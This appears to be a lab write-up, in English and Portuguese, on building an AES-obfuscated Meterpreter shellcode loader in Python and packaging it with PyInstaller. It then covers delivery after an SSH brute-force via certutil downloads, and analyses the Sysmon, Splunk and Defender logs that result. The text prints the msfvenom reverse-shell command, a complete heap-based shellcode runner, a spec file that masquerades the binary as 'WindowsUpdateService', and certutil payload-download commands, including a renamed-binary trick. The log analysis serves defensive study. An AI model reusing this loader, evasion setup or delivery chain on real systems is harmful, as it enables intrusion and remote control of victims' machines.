# 🛡️ Evasão e Execução: Criando, Ofuscando e Entregando Shellcode com AES e PyInstaller


## 

In this technical write-up, we conduct a hands-on experiment simulating a Windows defense evasion attack. We create a payload using Metasploit, obfuscate it with AES encryption in Python, and package the malware with PyInstaller.

For delivery, we explore a realistic scenario: an SSH brute-force attack followed by using ```certutil.exe``` to download the payload—a technique often classified as Living Off the Land Binary (LOLBin).

Throughout the process, we analyze artifacts with Sysmon and Splunk, documenting key indicators and behaviors for SOC analysts and blue teamers.

---

## DISCLAMER 

**LEGAL NOTICE:** This article is for educational purposes only. All activities were performed in isolated, controlled environments.
Never execute these techniques on systems you do not own or lack explicit authorization to test. Misuse of this information is solely the reader’s responsibility.


## ⚙️ TEST ENVIROMENT

| Componente     | Detalhes                                          |
|----------------|---------------------------------------------------|
| Attacker       | Kali Linux                                        |
| Target         | Windows 10                                        |
| Tools          | Splunk, Sysmon, Wine, Veil, Python, Metasploit    |
| Techniques     | Brute Force, reverse shel, LOLbin                 |

---


## 🧪 Splunk Configuration Issues 


During Splunk setup, I encountered issues receiving Sysmon logs in the Splunk GUI. After troubleshooting, I discovered it was a Windows permissions problem. In the Services panel, under the Log On tab, the Local System Account option must be selected, as shown below:

 [GRANTING SPLUNK PERMISSIONS ON TARGET MACHINE]
 ![Image](https://github.com/user-attachments/assets/6e6b6d0f-1e6f-417a-a815-d30c4effb318)

 To receive logs in Splunk, add this code to the output.conf file if not already configured:
  
  [INPUTS.CONF FILE]
![Image](https://github.com/user-attachments/assets/1c1531f3-a47a-4fe6-825c-bb597b36d014)




## 🧪 MALWARE CREATION AND OBFUSCATION

**Shellcode Generation**

For this experiment, I used a Metasploit shellcode obfuscated with Python. The following command generates a raw shellcode:

```xml msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.56.103 LPORT=3135 -f raw -o result3.raw```

This outputs a .raw shellcode, which we then convert to a hexadecimal string:

```xml  xxd -p result3.raw | tr -d '\n' | sed 's/\(..\)/\\x\1/g' > result03.txt ```

  [SHELLCODE EM CONDIGO HEXADECIMAL]
   ![Image](https://github.com/user-attachments/assets/4263f989-ef76-4d00-936e-32da016fc588)

**AES Encryption**

Next, I encrypted the shellcode using a 16-byte (128-bit) AES key to bypass Windows defenses. Below is the Python script for encryption:

[PRINT DO VS CODE ENCRYPTACAO]
![Image](https://github.com/user-attachments/assets/e32f7c99-fe4f-4b0e-ae34-aabd9e52e414)

The shellcode is now ready for embedding.


### Memory Allocation: VirtualAlloc vs. HeapAlloc

   While researching malware development, I encountered two memory allocation methods:

  1. ```VirtualAlloc```: Allocates large memory blocks, leaving clear forensic traces (often flagged by defenses).
  Classic combo: VirtualAlloc + WriteProcessMemory + CreateRemoteThread.

 2. ```HeapAlloc```: Uses smaller memory chunks (common in legit apps), requiring HEAP_CREATE_ENABLE_EXECUTE to mark memory as executable.
  Less suspicious but requires extra steps.

For evasion, I chose ```HeapAlloc```.

Note: Later, I learned VirtualAlloc + VirtualProtect might be more effective for bypassing defenses—a topic for future research.


### Python Execution Script

This script decrypts the AES-CBC shellcode (stored in Base64), removes PKCS7 padding, allocates executable memory in a private heap, and runs the shellcode via CreateThread.PKCS7 is a padding method used in block ciphers like AES to ensure data fits the cipher's block size (e.g., 16 bytes for AES-128).


 ```Python
import base64
import ctypes
from Crypto.Cipher import AES

# === KEY AND IV (must match those used during encryption) ===
key = b'ThisIsA16ByteKey'
iv = b'ThisIsA16ByteIV!'

# === Encrypted shellcode (base64) ===
encrypted_b64 = b"2G8Rv5XtiV6HwQS/DsUBAOQB+pUlMLPJ+KwsV9Ixm8ym6BdI7s5kNf0Qw++2d7qKp3ykcrNXnodX8a"
encrypted = base64.b64decode(encrypted_b64)

# === Decrypt using AES-CBC ===
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(encrypted)

# === Remove PKCS7 padding ===
pad_len = decrypted[-1]
shellcode = decrypted[:-pad_len]

# === Create a private heap ===
heap = ctypes.windll.kernel32.HeapCreate(0x00040000, len(shellcode), 0)  # HEAP_CREATE_ENABLE_EXECUTE
if not heap:
    raise Exception("HeapCreate failed")

# === Allocate executable memory in the heap ===
ptr = ctypes.windll.kernel32.HeapAlloc(heap, 0x00000008, len(shellcode))  # HEAP_ZERO_MEMORY
if not ptr:
    raise Exception("HeapAlloc failed")

# === Copy shellcode to the heap ===
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_void_p(ptr),
    shellcode,
    len(shellcode)
)

# === Execute the shellcode ===
ht = ctypes.windll.kernel32.CreateThread(
    None,
    0,
    ctypes.c_void_p(ptr),
    None,
    0,
    None
)

ctypes.windll.kernel32.WaitForSingleObject(ht, -1)
 ```
    
## 🧪 GENERATING THE EXECUTABLE

After configuring the code, I compiled it into an executable using PyInstaller via Wine on Kali Linux:

```bash
wine cmd
pyinstaller --noconfirm --onefile malwareobfuscated.py
```
[PYINSTALLER OUTPUT]
![Image](https://github.com/user-attachments/assets/beb0f0eb-2ece-4e54-8f8e-7e046adbf5b3)

This generates an executable and a .spec file, which we modify to enhance evasion:

### .SPEC FILE 

```
# -*- mode: python ; coding: utf-8 -*-

block_cipher = None

a = Analysis(
    ['malwareobfuscated.py'],
    pathex=['.'],
    binaries=[],
    datas=[],
    hiddenimports=[],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
    optimize=2,  # enable bytecode optimization
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    [],
    exclude_binaries=True,
    name='WindowsUpdateService',  # process name — mimics a legitimate system service
    debug=False,
    bootloader_ignore_signals=False,
    strip=True,  # strip debug symbols from executable
    upx=True,  # apply UPX compression to reduce file size
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,  # hide console window 
    disable_windowed_traceback=True,  # disable error pop-ups on crash
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
)

coll = COLLECT(
    exe,
    a.binaries,
    a.zipfiles,
    a.datas,
    strip=True,
    upx=True,
    name='WindowsUpdateService'
)

```


Key Evasion Features:

   - Process Masquerading: Named WindowsUpdateService.exe.

   - Stealth: No console window, UPX compression, stripped debug symbols.

To build the final executable:

```
wine cmd
pyinstaller --onefile malwareobfuscated.spec
```

[EXECUTABLE GENERATION .SPEC]
![Image](https://github.com/user-attachments/assets/7204a618-1173-485a-9aed-f3a4c04d3fba)


[MALWARE READY FOR DELIVERY]
![Image](https://github.com/user-attachments/assets/1db11fe3-941a-4fe1-957e-f6bf72283ac7)


## DELIVERING THE MALWARE 

Attack Flow:

  1. Brute-force SSH on an open port.

  2. Download malware via certutil.exe (LOLBin).

 ```certutil.exe -urlcache -split -f http://198.168.17.88/payload.exe payload.exe```



### 1. Brute-Force Success

[BRUTE-FORCE RESULTS]
![Image](https://github.com/user-attachments/assets/0e8ada1a-815a-4354-b30b-28359acb8ac5)

Logo apos realizei a requisicao usando certutil.exe como LOLbin:

### First Delivery Attempt

[CERTUTIL DOWNLOAD ATTEMPT]
![Image](https://github.com/user-attachments/assets/c6d4358d-8941-412d-8095-1a895984bab0)

**What I observed:**
At first, I assumed certutil.exe had successfully downloaded the malware, and Windows Defender blocked its execution after the transfer. However, no GET request appeared in the Python server logs (as shown in the screenshot), suggesting the request was intercepted before reaching the server.

**Testing the theory:**
To confirm, I tried downloading a harmless file from google.com using the same certutil.exe command:


🔍 **Microsoft Defender Detection Log**
```
- **Product**: Microsoft Defender Antivirus  
- **Product Version**: 4.18.25040.2  
- **Detection ID**: {5BE40275-E18B-40CA-8D0A-659F906123B2}  
- **Detection Time**: 2025-05-27 15:29:04 UTC  
- **Threat Name**: Trojan:Win32/Ceprolad.A  
- **Severity**: Severe  
- **Category**: Trojan  
- **Detection User**: NT AUTHORITY\SYSTEM  
- **Process Name**: Unknown  
- **Command Line**: `certutil.exe -urlcache -split -f https://google.com`  
- **Path**: C:\Windows\System32\certutil.exe  
- **Action Taken**: Not Applicable (automatically blocked)  
- **Engine Version**: AM: 1.1.25040.1  
- **Signature Version**: AV: 1.429.193.0  
- **Reference**: [Microsoft Threat Info](https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Ceprolad.A&threatid=2147726914&enterprise=0)
```
Same behavior: No network traffic reached Google
Even though the URL points to a legitimate domain (Google), Microsoft Defender flagged the activity as malicious and identified it as `Trojan:Win32/Ceprolad.A`.  
This indicates that Windows Defender's protection system does not rely solely on the destination of network requests, but also monitors the behavior of processes within the system (behavior-based detection).


 ### 2 TENTATIVA:

Vamos tirar a prova final tentando uma ultima tecnica, vou criar uma copia do certutil.exe em um outro folder com um 
 outro nome e vou tentar realizar uma requisicao atraves desta copia, abaixo vou deixar os comandos usados e a resposta recebida.

```
1.
copy C:\Windows\System32\certutil.exe C:\Users\Public\curl.exe
2.
C:\Users\Public\curl.exe -urlcache -split -f https://www.google.com
```


 [RESPOSTA DA SEGUNDA TENTATIVA USANDO CERTUTIL]
 ![Image](https://github.com/user-attachments/assets/1d7c7848-f616-4888-bb17-a946f862cb52)

Mesmo executando o comando de um outro diretorio e fazendo uma requisicao para um site confiavel o Windows Defender detectou a atividade e bloqueou a acao.

### 3 TENTATIVA 

Ja que nao podemos usar certutil para realizar o download vou fazer uma requisicao curl simples para verificar se o defender identifica a presenca do malware

```curl http://192.168.56.101:7070/WindowsUpdateService```
![Image](https://github.com/user-attachments/assets/6b3edd1e-86f3-497a-99b3-917e924713c4)


 Mesmo com a encryptacao e ofuscacao o windows defender detectou a presenca do malware e o bloqueou porem 
 essa atividade gerou alguns logs interessantes que vamos analisar no proximo capitulo

![Image](https://github.com/user-attachments/assets/7647fae1-edd7-4f82-82a3-9d75d20fb688)


---

## 🔍 ANALISE DOS LOGS

**Note:** Para escrever esse artigo realizei a entrega do malware muitas vezes em dias diferentes entao nao se prendam muito as datas dos logs 


1. [BRUTE FORCE EVIDENCE]
![Image](https://github.com/user-attachments/assets/f7f7b16d-4762-4bfe-aec9-bd20f96bf1fd)
Essa quantidade tentativa de login em tao pouco tempo capturadas pelo splunk acende uma red flag analisando mais 
a fundo nos logs em sysmon encontamos mais uma eveidencia de atividade maliciosa
Durante a execução do payload ofuscado, mesmo antes de um shell ser estabelecido, o Event Viewer registrou os seguintes comportamentos:

2. [CREATION OF REMOTE TREAT]
 ![Image](https://github.com/user-attachments/assets/405cbb63-bf4f-40df-a30c-8129ed814e56)
Esse tipo de evento é típico de malwares que tentam executar código em outro processo para evitar detecção (como DLL injection). Entretanto nos ja sabemos que o malware nao foi nem se quer baixado
entao eu acredito que este log foi acionado quando eu solicitei um cmd.exe via ssh, mesmo que nao esteja diretamente relacionado com o malware ainda sim e um artefato importante.

3. [ACAO DE BLOQUEIO DO WINDOWS DEFENDER]
![Image](https://github.com/user-attachments/assets/ea9fae2a-8fe5-4ef5-aea2-cf221346e740)
Pouco após a tentativa download via cetutil.exe, o processo SecurityHealthHost.exe, parte do Windows Defender, foi invocado. Isso sugere que a carga/acao maliciosa foi identificada e bloqueada pela solução nativa do sistema, interrompendo a execução completa do ataque.

4. [IDENTIFICACAO PELO SISTEMA DE DEFESA]
![Image](https://github.com/user-attachments/assets/e1290956-49f1-473f-90bc-caf32dd7de12)

Neste log vemos a identificao pelo Windows Defender da tentativa de LOLbin separei os detalhes mais importantes no prompt abaixo. 

```
Threat Name:      Trojan:Win32/Ceprolad.A  
Severity:         Severe  
Detection Time:   2025-05-27 20:29:56 UTC  
Detected By:      NT AUTHORITY\SYSTEM  
Process Name:     certutil.exe  
Command Line:     certutil.exe -urlcache -split -f https://  
Path:             C:\Windows\System32\certutil.exe  
Action Taken:     Not Applicable 
```

Como podemos ver o Windows Defender bloqueou a requisicao antes que houve a conexao por isso nao foi identificado o IP.


4.[CONFIRMACAO DO BLOQUEIO PELO SISTEMA DE DEFESA]
![Image](https://github.com/user-attachments/assets/c427e929-77b8-4468-bb63-cbeb4c7bad3f)

Neste ultimo log nos temos a confirmacao de que a ameca foi removida com sucesso pelo windows defender ```Action Name: Remove```, ``` The operation completed successfully.```

5.[IDENTIFICACAO DA SEGUNDA TENTATIVA]
![Image](https://github.com/user-attachments/assets/aa39d6f0-9dad-4fba-831c-7bfe3a810af9)

```Path CmdLine:_C:\Users\Public\curl.exe -urlcache -split -f https://www.google.com```

Por ultimos mas nao menos importante temos a confirmacao que o Windows Defender localizaou a execucao maliciosa do
certutil.exe mesmo em um outro diretorio e com um nome diferente.

##CONCLUSAO 

Embora meu foco atual esteja na área de segurança defensiva, este laboratório acabou explorando técnicas ofensivas mais profundamente do que eu esperava. A criação e ofuscação do shellcode me deram uma visão prática de como cargas maliciosas podem ser construídas e executadas de forma discreta no Windows.

Apesar de o código ainda poder ser aprimorado com técnicas mais avançadas de evasão, essa experiência me proporcionou um entendimento mais concreto sobre como o Windows Defender e outras soluções de segurança operam, além de como algumas técnicas simples já são suficientes para contornar mecanismos de defesa padrão.

No contexto defensivo, isso reforça a importância de conhecer as ferramentas e táticas do adversário para desenvolver detecções mais eficazes, tanto em ambientes corporativos quanto em labs de threat hunting.



